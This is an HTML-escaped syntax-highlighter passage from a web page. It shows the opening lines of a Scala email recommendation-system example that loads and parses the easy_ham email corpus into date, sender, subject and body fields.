&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-105&quot;&gt;105&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-106&quot;&gt;106&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-107&quot;&gt;107&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-108&quot;&gt;108&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-109&quot;&gt;109&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-110&quot;&gt;110&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-111&quot;&gt;111&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-112&quot;&gt;112&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-113&quot;&gt;113&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-114&quot;&gt;114&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-115&quot;&gt;115&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-116&quot;&gt;116&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-117&quot;&gt;117&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-118&quot;&gt;118&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-119&quot;&gt;119&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-120&quot;&gt;120&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-121&quot;&gt;121&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-122&quot;&gt;122&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-123&quot;&gt;123&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-124&quot;&gt;124&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-125&quot;&gt;125&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-126&quot;&gt;126&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-127&quot;&gt;127&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-128&quot;&gt;128&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-129&quot;&gt;129&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-130&quot;&gt;130&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-131&quot;&gt;131&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-132&quot;&gt;132&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-133&quot;&gt;133&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-134&quot;&gt;134&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-135&quot;&gt;135&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-136&quot;&gt;136&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-137&quot;&gt;137&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-138&quot;&gt;138&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-139&quot;&gt;139&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-140&quot;&gt;140&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-141&quot;&gt;141&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-142&quot;&gt;142&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-143&quot;&gt;143&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-144&quot;&gt;144&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-145&quot;&gt;145&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-146&quot;&gt;146&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-147&quot;&gt;147&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-148&quot;&gt;148&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-149&quot;&gt;149&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-150&quot;&gt;150&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-151&quot;&gt;151&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-152&quot;&gt;152&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-153&quot;&gt;153&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-154&quot;&gt;154&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-155&quot;&gt;155&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-156&quot;&gt;156&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-157&quot;&gt;157&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-158&quot;&gt;158&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-159&quot;&gt;159&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-160&quot;&gt;160&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-161&quot;&gt;161&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-162&quot;&gt;162&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-163&quot;&gt;163&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-164&quot;&gt;164&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-165&quot;&gt;165&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-166&quot;&gt;166&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-167&quot;&gt;167&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-168&quot;&gt;168&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-169&quot;&gt;169&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-170&quot;&gt;170&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-171&quot;&gt;171&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-172&quot;&gt;172&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-173&quot;&gt;173&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-174&quot;&gt;174&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-175&quot;&gt;175&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-176&quot;&gt;176&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-177&quot;&gt;177&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-178&quot;&gt;178&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-179&quot;&gt;179&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-180&quot;&gt;180&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-181&quot;&gt;181&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-182&quot;&gt;182&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-183&quot;&gt;183&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-184&quot;&gt;184&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-185&quot;&gt;185&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-186&quot;&gt;186&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-187&quot;&gt;187&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-188&quot;&gt;188&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06135f418088009-189&quot;&gt;189&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06135f418088009-190&quot;&gt;190&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;awt&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Rectangle&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-2&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;File&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-3&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleDateFormat&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;java&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;Date&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-5&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;smile&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;plot&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;BarPlot&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-6&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-7&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;swing&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;}&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;import &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;scala&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;util&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;Try&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-10&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;object&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;RecommendationSystem&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;extends&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;SimpleSwingApplication&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-11&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-12&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;case&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;EmailData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;emailDate&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Date&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;sender&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;subject&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-13&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-14&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;def &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;top&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;MainFrame&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;{&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-15&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;title&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;Recommendation System Example&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-16&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-17&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/Users/../data&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-18&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;easyHamPath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;basePath&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot;/easy_ham&quot;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-19&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;mails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFilesFromDir&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;easyHamPath&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getFullEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-21&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;val &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;timeSortedMails&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;mails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-22&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;EmailData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getDateFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-23&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getSenderFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-24&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getSubjectFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-25&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                                &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;getMessageBodyFromEmail&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d06135f418088009-26&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d06135f418088009-27&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
